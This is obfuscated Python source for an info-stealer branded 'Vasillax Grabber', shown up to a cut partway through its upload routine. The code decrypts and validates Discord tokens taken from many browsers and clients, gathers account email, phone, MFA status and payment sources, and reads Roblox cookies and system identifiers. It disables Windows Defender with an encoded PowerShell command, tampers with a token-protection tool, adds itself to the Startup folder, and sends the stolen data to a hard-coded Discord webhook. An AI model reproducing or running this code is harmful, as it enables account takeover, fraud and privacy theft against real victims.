import base64 #line:1
import ctypes #line:2
import json #line:3
import os #line:4
import random #line:5
import re #line:6
import sqlite3 #line:7
import subprocess #line:8
import sys #line:9
import threading #line:10
import time #line:11
from shutil import copy2 #line:12
from zipfile import ZIP_DEFLATED ,ZipFile #line:13
import psutil #line:15
import requests #line:16
from Crypto .Cipher import AES #line:17
from PIL import ImageGrab #line:18
from requests_toolbelt .multipart .encoder import MultipartEncoder #line:19
from win32crypt import CryptUnprotectData #line:20
__CONFIG__ ={'webhook':'https://discord.com/api/webhooks/1113535070335148075/RC9hppbP9oQ2ZVkC0JjtzPERAjF29GYGU10QDNorS5kNyuSkUpLprctUD1H1yn6aUQeL','ping':False ,'pingtype':'Here','error':False ,'startup':False ,'defender':False ,'systeminfo':False ,'backupcodes':True ,'browser':False ,'roblox':False ,'obfuscation':False ,'injection':False ,'minecraft':False ,'wifi':False ,'killprotector':False ,'antidebug_vm':False ,'discord':True ,'anti_spam':False ,'self_destruct':False }#line:22
temp =os .getenv ("temp")#line:25
temp_path =os .path .join (temp ,''.join (random .choices ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",k =10 )))#line:26
mk_temp =os .mkdir (temp_path )#line:27
localappdata =os .getenv ("localappdata")#line:28
def main (OO00000000O0OOO00 :str ):#line:31
    O00OO0O0O00O00OOO =[Browsers ,Wifi ,Minecraft ,BackupCodes ,killprotector ,fakeerror ,startup ,disable_defender ]#line:32
    configcheck (O00OO0O0O00O00OOO )#line:33
    for OO00O0000000000OO in O00OO0O0O00O00OOO :#line:35
        OO00OOO00O00OOO0O =threading .Thread (target =OO00O0000000000OO ,daemon =True )#line:36
        OO00OOO00O00OOO0O .start ()#line:37
    for OOOO0O0OOO0000OOO in threading .enumerate ():#line:38
        try :#line:39
            OOOO0O0OOO0000OOO .join ()#line:40
        except RuntimeError :#line:41
            continue #line:42
    zipup ()#line:44
    OOO000OO0O00O0O00 ={"username":"Vasillax","avatar_url":"https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"}#line:49
    _OO000000O0O00000O =f'{localappdata}\\Vasillax-Logged-{os.getlogin()}.zip'#line:51
    if __CONFIG__ ["ping"]:#line:53
        if __CONFIG__ ["pingtype"]in ["Everyone","Here"]:#line:54
            O00OOO00OO00O0OOO =f"@{__CONFIG__['pingtype'].lower()}"#line:55
            OOO000OO0O00O0O00 .update ({"content":O00OOO00OO00O0OOO })#line:56
    if __CONFIG__ ["roblox"]or __CONFIG__ ["browser"]or __CONFIG__ ["wifi"]or __CONFIG__ ["minecraft"]or __CONFIG__ ["backupcodes"]:#line:58
        with open (_OO000000O0O00000O ,'rb')as OOO0O00O0O0OO0OOO :#line:59
            O00OOO0O0OOO000OO =MultipartEncoder ({'payload_json':json .dumps (OOO000OO0O00O0O00 ),'file':(f'Vasillax-Logged-{os.getlogin()}.zip',OOO0O00O0O0OO0OOO ,'application/zip')})#line:60
            requests .post (OO00000000O0OOO00 ,headers ={'Content-type':O00OOO0O0OOO000OO .content_type },data =O00OOO0O0OOO000OO )#line:61
    else :#line:62
        requests .post (OO00000000O0OOO00 ,json =OOO000OO0O00O0O00 )#line:63
    if __CONFIG__ ["systeminfo"]:#line:65
        PcInfo ()#line:66
    if __CONFIG__ ["discord"]:#line:68
        Discord ()#line:69
    os .remove (_OO000000O0O00000O )#line:71
def Vasillax (OO0OOOO000O0O00OO :str ):#line:74
    if __CONFIG__ ["anti_spam"]:#line:75
        AntiSpam ()#line:76
    if __CONFIG__ ["antidebug_vm"]:#line:78
        Debug ()#line:79
    O00O0O000O0O0OO0O =[main ,Injection ]#line:81
    if not __CONFIG__ ["injection"]:#line:82
        O00O0O000O0O0OO0O .remove (Injection )#line:83
    for OOO0O00000OO0O000 in O00O0O000O0O0OO0O :#line:85
        OOO0O00000OO0O000 (OO0OOOO000O0O00OO )#line:86
    if __CONFIG__ ["self_destruct"]:#line:88
        SelfDestruct ()#line:89
def configcheck (OOO0OO00O0OO0OOOO ):#line:92
    if not __CONFIG__ ["error"]:#line:93
        OOO0OO00O0OO0OOOO .remove (fakeerror )#line:94
    if not __CONFIG__ ["startup"]:#line:95
        OOO0OO00O0OO0OOOO .remove (startup )#line:96
    if not __CONFIG__ ["defender"]:#line:97
        OOO0OO00O0OO0OOOO .remove (disable_defender )#line:98
    if not __CONFIG__ ["browser"]:#line:99
        OOO0OO00O0OO0OOOO .remove (Browsers )#line:100
    if not __CONFIG__ ["wifi"]:#line:101
        OOO0OO00O0OO0OOOO .remove (Wifi )#line:102
    if not __CONFIG__ ["minecraft"]:#line:103
        OOO0OO00O0OO0OOOO .remove (Minecraft )#line:104
    if not __CONFIG__ ["backupcodes"]:#line:105
        OOO0OO00O0OO0OOOO .remove (BackupCodes )#line:106
def fakeerror ():#line:109
    ctypes .windll .user32 .MessageBoxW (None ,'Error code: 0x80070002\nAn internal error occurred while importing modules.','Fatal Error',0 )#line:110
def startup ():#line:113
    OO000O0O0OO0O0000 =os .path .join (os .getenv ("APPDATA"),"Microsoft","Windows","Start Menu","Programs","Startup")#line:114
    if hasattr (sys ,'frozen'):#line:115
        OOOOOO0OO000O00O0 =sys .executable #line:116
    else :#line:117
        OOOOOO0OO000O00O0 =sys .argv [0 ]#line:118
    O0O0O0O0O00000000 =os .path .join (OO000O0O0OO0O0000 ,os .path .basename (OOOOOO0OO000O00O0 ))#line:120
    if os .path .exists (O0O0O0O0O00000000 ):#line:121
        os .remove (O0O0O0O0O00000000 )#line:122
    copy2 (OOOOOO0OO000O00O0 ,OO000O0O0OO0O0000 )#line:124
def disable_defender ():#line:127
    OO0OOO00O0OOO0O00 =base64 .b64decode (b'cG93ZXJzaGVsbC5leGUgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUHJvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAyICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXEFwcERhdGEiICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXExvY2FsIiAmIHBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5leGUnIiAK').decode ()#line:128
    subprocess .run (OO0OOO00O0OOO0O00 ,shell =True ,capture_output =True )#line:129
def create_temp (_dir :str or os .PathLike =None ):#line:132
    if _dir is None :#line:133
        _dir =os .path .expanduser ("~/tmp")#line:134
    if not os .path .exists (_dir ):#line:135
        os .makedirs (_dir )#line:136
    O00000O0OO00O0OO0 =''.join (random .SystemRandom ().choice ('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')for _OOOO0O00O00O0O000 in range (random .randint (10 ,20 )))#line:137
    OOOO0O0OO00O00OO0 =os .path .join (_dir ,O00000O0OO00O0OO0 )#line:138
    open (OOOO0O0OO00O00OO0 ,"x").close ()#line:139
    return OOOO0O0OO00O00OO0 #line:140
def killprotector ():#line:143
    O00O0O00O00OOO00O =os .getenv ('APPDATA')#line:144
    O00O0OOOOO00OO0O0 =f"{O00O0O00O00OOO00O}\\DiscordTokenProtector\\"#line:145
    OO0OO000000OOOO0O =O00O0OOOOO00OO0O0 +"config.json"#line:146
    if not os .path .exists (O00O0OOOOO00OO0O0 ):#line:148
        return #line:149
    for O00OOO000OOOO00O0 in ["DiscordTokenProtector.exe","ProtectionPayload.dll","secure.dat"]:#line:151
        try :#line:152
            os .remove (O00O0OOOOO00OO0O0 +O00OOO000OOOO00O0 )#line:153
        except FileNotFoundError :#line:154
            pass #line:155
    if os .path .exists (OO0OO000000OOOO0O ):#line:157
        with open (OO0OO000000OOOO0O ,errors ="ignore")as O000O0O0O000O0000 :#line:158
            try :#line:159
                OOOOOO000O0O00O00 =json .load (O000O0O0O000O0000 )#line:160
            except json .decoder .JSONDecodeError :#line:161
                return #line:162
            OOOOOO000O0O00O00 ['auto_start']=False #line:163
            OOOOOO000O0O00O00 ['auto_start_discord']=False #line:164
            OOOOOO000O0O00O00 ['integrity']=False #line:165
            OOOOOO000O0O00O00 ['integrity_allowbetterdiscord']=False #line:166
            OOOOOO000O0O00O00 ['integrity_checkexecutable']=False #line:167
            OOOOOO000O0O00O00 ['integrity_checkhash']=False #line:168
            OOOOOO000O0O00O00 ['integrity_checkmodule']=False #line:169
            OOOOOO000O0O00O00 ['integrity_checkscripts']=False #line:170
            OOOOOO000O0O00O00 ['integrity_checkresource']=False #line:171
            OOOOOO000O0O00O00 ['integrity_redownloadhashes']=False #line:172
            OOOOOO000O0O00O00 ['iterations_iv']=364 #line:173
            OOOOOO000O0O00O00 ['iterations_key']=457 #line:174
            OOOOOO000O0O00O00 ['version']=69420 #line:175
        with open (OO0OO000000OOOO0O ,'w')as O000O0O0O000O0000 :#line:177
            json .dump (OOOOOO000O0O00O00 ,O000O0O0O000O0000 ,indent =2 ,sort_keys =True )#line:178
def zipup ():#line:181
    _O0O000000000O00OO =os .path .join (localappdata ,f'Vasillax-Logged-{os.getlogin()}.zip')#line:182
    OO00O00OO00O0O0O0 =ZipFile (_O0O000000000O00OO ,"w",ZIP_DEFLATED )#line:183
    OO0O0OO0O0O00O0O0 =os .path .abspath (temp_path )#line:184
    for OO0O00O000OOO0000 ,_O0OOO0OOO0OO00O0O ,OO0O0O0OOO0OO0000 in os .walk (temp_path ):#line:185
        for O0OO0O0OO0OOO00OO in OO0O0O0OOO0OO0000 :#line:186
            OO00O0OOO000OO0O0 =os .path .abspath (os .path .join (OO0O00O000OOO0000 ,O0OO0O0OO0OOO00OO ))#line:187
            OO0O00O0000O0OOO0 =OO00O0OOO000OO0O0 [len (OO0O0OO0O0O00O0O0 )+1 :]#line:188
            OO00O00OO00O0O0O0 .write (OO00O0OOO000OO0O0 ,OO0O00O0000O0OOO0 )#line:189
    OO00O00OO00O0O0O0 .close ()#line:190
class PcInfo :#line:193
    def __init__ (O0OO00O0OO0O0O000 ):#line:194
        O0OO00O0OO0O0O000 .get_inf (__CONFIG__ ["webhook"])#line:195
    def get_inf (OO0O0OOOO0OOO00O0 ,OOOO0OO0O00000OO0 ):#line:197
        O0OOO0O00OO0OOOOO =subprocess .run ('wmic os get Caption',capture_output =True ,shell =True ).stdout .decode (errors ='ignore').strip ().splitlines ()[2 ].strip ()#line:198
        O0000O00OO000OOO0 =subprocess .run (["wmic","cpu","get","Name"],capture_output =True ,text =True ).stdout .strip ().split ('\n')[2 ]#line:199
        OO00OOOOOO00OO0OO =subprocess .run ("wmic path win32_VideoController get name",capture_output =True ,shell =True ).stdout .decode (errors ='ignore').splitlines ()[2 ].strip ()#line:200
        O0OO0000000OOO0O0 =str (int (int (subprocess .run ('wmic computersystem get totalphysicalmemory',capture_output =True ,shell =True ).stdout .decode (errors ='ignore').strip ().split ()[1 ])/1000000000 ))#line:202
        O0O0O00OO000O0O0O =os .getenv ("UserName")#line:203
        OOOOO0OO0OOOO00O0 =os .getenv ("COMPUTERNAME")#line:204
        OOOOOOOO00OOO0OOO =subprocess .check_output ('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid',shell =True ,stdin =subprocess .PIPE ,stderr =subprocess .PIPE ).decode ('utf-8').split ('\n')[1 ].strip ()#line:206
        OO0OOO0O0OO00000O =requests .get ('https://api.ipify.org').text #line:207
        O0O00O00OOO000000 ,OOO00O0O0OO00O0O0 =next (iter (psutil .net_if_addrs ().items ()))#line:208
        OO00OO0O00O00O0O0 =OOO00O0O0OO00O0O0 [0 ].address #line:209
        OO0O0OO000000OO0O ={"embeds":[{"title":"Vasillax Logger","color":5639644 ,"fields":[{"name":"System Info","value":f'''💻 **PC Username:** `{O0O0O00OO000O0O0O}`\n:desktop: **PC Name:** `{OOOOO0OO0OOOO00O0}`\n🌐 **OS:** `{O0OOO0O00OO0OOOOO}`\n\n👀 **IP:** `{OO0OOO0O0OO00000O}`\n🍏 **MAC:** `{OO00OO0O00O00O0O0}`\n🔧 **HWID:** `{OOOOOOOO00OOO0OOO}`\n\n<:cpu:1051512676947349525> **CPU:** `{O0000O00OO000OOO0}`\n<:gpu:1051512654591688815> **GPU:** `{OO00OOOOOO00OO0OO}`\n<:ram1:1051518404181368972> **RAM:** `{O0OO0000000OOO0O0}GB`'''}],"footer":{"text":"Vasillax Grabber | Created By Smug"},"thumbnail":{"url":"https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"}}],"username":"Vasillax","avatar_url":"https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"}#line:232
        requests .post (OOOO0OO0O00000OO0 ,json =OO0O0OO000000OO0O )#line:234
class Discord :#line:237
    def __init__ (O000O00O00OO0O000 ):#line:238
        O000O00O00OO0O000 .baseurl ="https://discord.com/api/v9/users/@me"#line:239
        O000O00O00OO0O000 .appdata =os .getenv ("localappdata")#line:240
        O000O00O00OO0O000 .roaming =os .getenv ("appdata")#line:241
        O000O00O00OO0O000 .regex =r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"#line:242
        O000O00O00OO0O000 .encrypted_regex =r"dQw4w9WgXcQ:[^\"]*"#line:243
        O000O00O00OO0O000 .tokens_sent =[]#line:244
        O000O00O00OO0O000 .tokens =[]#line:245
        O000O00O00OO0O000 .ids =[]#line:246
        O000O00O00OO0O000 .grabTokens ()#line:248
        O000O00O00OO0O000 .upload (__CONFIG__ ["webhook"])#line:249
    def decrypt_val (O0O000OOOOO0O000O ,OOO0O0O0000O00O00 ,O0OOO00OOO0O000O0 ):#line:251
        try :#line:252
            OO0000O0000OOOOOO =OOO0O0O0000O00O00 [3 :15 ]#line:253
            OO0O0O0O0OO0O0O0O =OOO0O0O0000O00O00 [15 :]#line:254
            OOOO0OO000OO0000O =AES .new (O0OOO00OOO0O000O0 ,AES .MODE_GCM ,OO0000O0000OOOOOO )#line:255
            OOO0OOO0O000O00O0 =OOOO0OO000OO0000O .decrypt (OO0O0O0O0OO0O0O0O )#line:256
            OOO0OOO0O000O00O0 =OOO0OOO0O000O00O0 [:-16 ].decode ()#line:257
            return OOO0OOO0O000O00O0 #line:258
        except Exception :#line:259
            return "Failed to decrypt password"#line:260
    def get_master_key (O0O000O0000000O0O ,OOOO00OO00OOOOOO0 ):#line:262
        with open (OOOO00OO00OOOOOO0 ,"r",encoding ="utf-8")as OO0OO00O0000OO00O :#line:263
            OO0O0OOOO0O00OOO0 =OO0OO00O0000OO00O .read ()#line:264
        O0000000000OOO000 =json .loads (OO0O0OOOO0O00OOO0 )#line:265
        O0O0O00O0OOO0O000 =base64 .b64decode (O0000000000OOO000 ["os_crypt"]["encrypted_key"])#line:266
        O0O0O00O0OOO0O000 =O0O0O00O0OOO0O000 [5 :]#line:267
        O0O0O00O0OOO0O000 =CryptUnprotectData (O0O0O00O0OOO0O000 ,None ,None ,None ,0 )[1 ]#line:268
        return O0O0O00O0OOO0O000 #line:269
    def grabTokens (O0O000O00O0OO0OOO ):#line:271
        OOOO00O0OO000OO00 ={'Discord':O0O000O00O0OO0OOO .roaming +'\\discord\\Local Storage\\leveldb\\','Discord Canary':O0O000O00O0OO0OOO .roaming +'\\discordcanary\\Local Storage\\leveldb\\','Lightcord':O0O000O00O0OO0OOO .roaming +'\\Lightcord\\Local Storage\\leveldb\\','Discord PTB':O0O000O00O0OO0OOO .roaming +'\\discordptb\\Local Storage\\leveldb\\','Opera':O0O000O00O0OO0OOO .roaming +'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX':O0O000O00O0OO0OOO .roaming +'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo':O0O000O00O0OO0OOO .appdata +'\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch':O0O000O00O0OO0OOO .appdata +'\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa':O0O000O00O0OO0OOO .appdata +'\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum':O0O000O00O0OO0OOO .appdata +'\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser':O0O000O00O0OO0OOO .appdata +'\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star':O0O000O00O0OO0OOO .appdata +'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik':O0O000O00O0OO0OOO .appdata +'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi':O0O000O00O0OO0OOO .appdata +'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS':O0O000O00O0OO0OOO .appdata +'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome':O0O000O00O0OO0OOO .appdata +'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1':O0O000O00O0OO0OOO .appdata +'\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2':O0O000O00O0OO0OOO .appdata +'\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3':O0O000O00O0OO0OOO .appdata +'\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4':O0O000O00O0OO0OOO .appdata +'\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5':O0O000O00O0OO0OOO .appdata +'\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser':O0O000O00O0OO0OOO .appdata +'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge':O0O000O00O0OO0OOO .appdata +'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\','Uran':O0O000O00O0OO0OOO .appdata +'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex':O0O000O00O0OO0OOO .appdata +'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave':O0O000O00O0OO0OOO .appdata +'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium':O0O000O00O0OO0OOO .appdata +'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}#line:299
        for O00OOO000O0OOOO0O ,O0O00OO000OOOO00O in OOOO00O0OO000OO00 .items ():#line:301
            if not os .path .exists (O0O00OO000OOOO00O ):#line:302
                continue #line:303
            O0O0O0O00OOOO0OOO =O00OOO000O0OOOO0O .replace (" ","").lower ()#line:304
            if "cord"in O0O00OO000OOOO00O :#line:305
                if os .path .exists (O0O000O00O0OO0OOO .roaming +f'\\{O0O0O0O00OOOO0OOO}\\Local State'):#line:306
                    for OO0OO000000O0OOOO in os .listdir (O0O00OO000OOOO00O ):#line:307
                        if OO0OO000000O0OOOO [-3 :]not in ["log","ldb"]:#line:308
                            continue #line:309
                        for OOO0OO0OOOO0OO0O0 in [O000000OO000O0O0O .strip ()for O000000OO000O0O0O in open (f'{O0O00OO000OOOO00O}\\{OO0OO000000O0OOOO}',errors ='ignore').readlines ()if O000000OO000O0O0O .strip ()]:#line:310
                            for OO0O00O0OO0OOOOOO in re .findall (O0O000O00O0OO0OOO .encrypted_regex ,OOO0OO0OOOO0OO0O0 ):#line:311
                                OO00OO0O0000O00O0 =O0O000O00O0OO0OOO .decrypt_val (base64 .b64decode (OO0O00O0OO0OOOOOO .split ('dQw4w9WgXcQ:')[1 ]),O0O000O00O0OO0OOO .get_master_key (O0O000O00O0OO0OOO .roaming +f'\\{O0O0O0O00OOOO0OOO}\\Local State'))#line:312
                                OOOOOO0O0OO000O00 =requests .get (O0O000O00O0OO0OOO .baseurl ,headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type':'application/json','Authorization':OO00OO0O0000O00O0 })#line:316
                                if OOOOOO0O0OO000O00 .status_code ==200 :#line:317
                                    O0O0O0O0O00OOOO00 =OOOOOO0O0OO000O00 .json ()['id']#line:318
                                    if O0O0O0O0O00OOOO00 not in O0O000O00O0OO0OOO .ids :#line:319
                                        O0O000O00O0OO0OOO .tokens .append (OO00OO0O0000O00O0 )#line:320
                                        O0O000O00O0OO0OOO .ids .append (O0O0O0O0O00OOOO00 )#line:321
            else :#line:322
                for OO0OO000000O0OOOO in os .listdir (O0O00OO000OOOO00O ):#line:323
                    if OO0OO000000O0OOOO [-3 :]not in ["log","ldb"]:#line:324
                        continue #line:325
                    for OOO0OO0OOOO0OO0O0 in [OO000OO0000OOOOO0 .strip ()for OO000OO0000OOOOO0 in open (f'{O0O00OO000OOOO00O}\\{OO0OO000000O0OOOO}',errors ='ignore').readlines ()if OO000OO0000OOOOO0 .strip ()]:#line:326
                        for OO00OO0O0000O00O0 in re .findall (O0O000O00O0OO0OOO .regex ,OOO0OO0OOOO0OO0O0 ):#line:327
                            OOOOOO0O0OO000O00 =requests .get (O0O000O00O0OO0OOO .baseurl ,headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type':'application/json','Authorization':OO00OO0O0000O00O0 })#line:331
                            if OOOOOO0O0OO000O00 .status_code ==200 :#line:332
                                O0O0O0O0O00OOOO00 =OOOOOO0O0OO000O00 .json ()['id']#line:333
                                if O0O0O0O0O00OOOO00 not in O0O000O00O0OO0OOO .ids :#line:334
                                    O0O000O00O0OO0OOO .tokens .append (OO00OO0O0000O00O0 )#line:335
                                    O0O000O00O0OO0OOO .ids .append (O0O0O0O0O00OOOO00 )#line:336
        if os .path .exists (O0O000O00O0OO0OOO .roaming +"\\Mozilla\\Firefox\\Profiles"):#line:338
            for O0O00OO000OOOO00O ,_O00OO00O00000OOO0 ,OO0OOOO0O0OOOO0O0 in os .walk (O0O000O00O0OO0OOO .roaming +"\\Mozilla\\Firefox\\Profiles"):#line:339
                for _OOOOOOO0O0O00O000 in OO0OOOO0O0OOOO0O0 :#line:340
                    if not _OOOOOOO0O0O00O000 .endswith ('.sqlite'):#line:341
                        continue #line:342
                    for OOO0OO0OOOO0OO0O0 in [O00OO0OO00OOO0OOO .strip ()for O00OO0OO00OOO0OOO in open (f'{O0O00OO000OOOO00O}\\{_OOOOOOO0O0O00O000}',errors ='ignore').readlines ()if O00OO0OO00OOO0OOO .strip ()]:#line:343
                        for OO00OO0O0000O00O0 in re .findall (O0O000O00O0OO0OOO .regex ,OOO0OO0OOOO0OO0O0 ):#line:344
                            OOOOOO0O0OO000O00 =requests .get (O0O000O00O0OO0OOO .baseurl ,headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type':'application/json','Authorization':OO00OO0O0000O00O0 })#line:348
                            if OOOOOO0O0OO000O00 .status_code ==200 :#line:349
                                O0O0O0O0O00OOOO00 =OOOOOO0O0OO000O00 .json ()['id']#line:350
                                if O0O0O0O0O00OOOO00 not in O0O000O00O0OO0OOO .ids :#line:351
                                    O0O000O00O0OO0OOO .tokens .append (OO00OO0O0000O00O0 )#line:352
                                    O0O000O00O0OO0OOO .ids .append (O0O0O0O0O00OOOO00 )#line:353
    def robloxinfo (O00OOO00O000OOO00 ,OO00O0OOO0OO00OO0 ):#line:355
        if __CONFIG__ ["roblox"]:#line:356
            with open (os .path .join (temp_path ,"Browser","roblox cookies.txt"),'r',encoding ="utf-8")as O0OOO000OO0000000 :#line:357
                O00OO0O00000OOOOO =O0OOO000OO0000000 .read ().strip ()#line:358
                if O00OO0O00000OOOOO =="No Roblox Cookies Found":#line:359
                    pass #line:360
                else :#line:361
                    OOO0OOOO00O0OOO0O ={"Cookie":".ROBLOSECURITY="+O00OO0O00000OOOOO }#line:362
                    O0O000000O00OOOO0 =None #line:363
                    try :#line:364
                        O0OOO0OO000O00O0O =requests .get ("https://www.roblox.com/mobileapi/userinfo",headers =OOO0OOOO00O0OOO0O )#line:365
                        O0OOO0OO000O00O0O .raise_for_status ()#line:366
                        O0O000000O00OOOO0 =O0OOO0OO000O00O0O .json ()#line:367
                    except requests .exceptions .HTTPError :#line:368
                        pass #line:369
                    except requests .exceptions .RequestException :#line:370
                        pass #line:371
                    if O0O000000O00OOOO0 is not None :#line:372
                        O00O00O000O0OOO00 ={"embeds":[{"title":"Roblox Info","color":5639644 ,"fields":[{"name":"<:roblox_icon:1041819334969937931> Name:","value":f"`{O0O000000O00OOOO0['UserName']}`","inline":True },{"name":"<:robux_coin:1041813572407283842> Robux:","value":f"`{O0O000000O00OOOO0['RobuxBalance']}`","inline":True },{"name":"🍪 Cookie:","value":f"`{O00OO0O00000OOOOO}`"}],"thumbnail":{"url":O0O000000O00OOOO0 ['ThumbnailUrl']},"footer":{"text":"Vasillax Grabber | Created By Smug"},}],"username":"Vasillax","avatar_url":"https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",}#line:404
                        requests .post (OO00O0OOO0OO00OO0 ,json =O00O00O000O0OOO00 )#line:405
    def upload (O00OOOOOO0OOOOOOO ,OOO00O0O0000O0O00 ):#line:407
        for O00OO0O00OO0OO0OO in O00OOOOOO0OOOOOOO .tokens :#line:408
            if O00OO0O00OO0OO0OO in O00OOOOOO0OOOOOOO .tokens_sent :#line:409
                pass #line:410
            OOO0O00OOO0O0OO0O =[]#line:412
            O0000OOOO0OO0O00O =""#line:413
            O00OOO0OOOO00O0O0 =""#line:414
            O0O00OOO0O0OO0OOO ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type':'application/json','Authorization':O00OO0O00OO0OO0OO }#line:417
            OOOOO00OO0O0000O0 =requests .get (O00OOOOOO0OOOOOOO .baseurl ,headers =O0O00OOO0O0OO0OOO ).json ()#line:418
            OO00OO000OO0O0000 =requests .get ("https://discord.com/api/v6/users/@me/billing/payment-sources",headers =O0O00OOO0O0OO0OOO ).json ()#line:419
            O000OO0O00OO0O000 =requests .get ("https://discord.com/api/v9/users/@me/outbound-promotions/codes",headers =O0O00OOO0O0OO0OOO )#line:420
            OO0000O0OOOOO0000 =OOOOO00OO0O0000O0 ['username']+'#'+OOOOO00OO0O0000O0 ['discriminator']#line:421
            OO0OO0OOO0O0OOO0O =OOOOO00OO0O0000O0 ['id']#line:422
            OOO0000OO000O0OO0 =f"https://cdn.discordapp.com/avatars/{OO0OO0OOO0O0OOO0O}/{OOOOO00OO0O0000O0['avatar']}.gif"if requests .get (f"https://cdn.discordapp.com/avatars/{OO0OO0OOO0O0OOO0O}/{OOOOO00OO0O0000O0['avatar']}.gif").status_code ==200 else f"https://cdn.discordapp.com/avatars/{OO0OO0OOO0O0OOO0O}/{OOOOO00OO0O0000O0['avatar']}.png"#line:424
            OO0O0OO0O000OO0OO =OOOOO00OO0O0000O0 ['phone']#line:425
            O00OOO00OOO00OO00 =OOOOO00OO0O0000O0 ['email']#line:426
            if OOOOO00OO0O0000O0 ['mfa_enabled']:#line:428
                OOO0000O0O00000O0 ="✅"#line:429
            else :#line:430
                OOO0000O0O00000O0 ="❌"#line:431
            O00O00O0O0OO0000O ={0 :"❌",1 :"Nitro Classic",2 :"Nitro",3 :"Nitro Basic"}#line:438
            O00OOO0OOOO00O0O0 =O00O00O0O0OO0000O .get (OOOOO00OO0O0000O0 ['premium_type'],"❌")#line:439
            OOOO00OOO0O0OO0OO ="❌"#line:441
            if OO00OO000OO0O0000 :#line:442
                OOOO00OOO0O0OO0OO =""#line:443
                for OOOOO000OO0O0OO00 in OO00OO000OO0O0000 :#line:444
                    if OOOOO000OO0O0OO00 ['type']==1 :#line:445
                        OOOO00OOO0O0OO0OO +="💳"#line:446
                    elif OOOOO000OO0O0OO00 ['type']==2 :#line:447
                        OOOO00OOO0O0OO0OO +="<:paypal:973417655627288666>"#line:448
                    else :#line:449
                        OOOO00OOO0O0OO0OO +="❓"#line:450
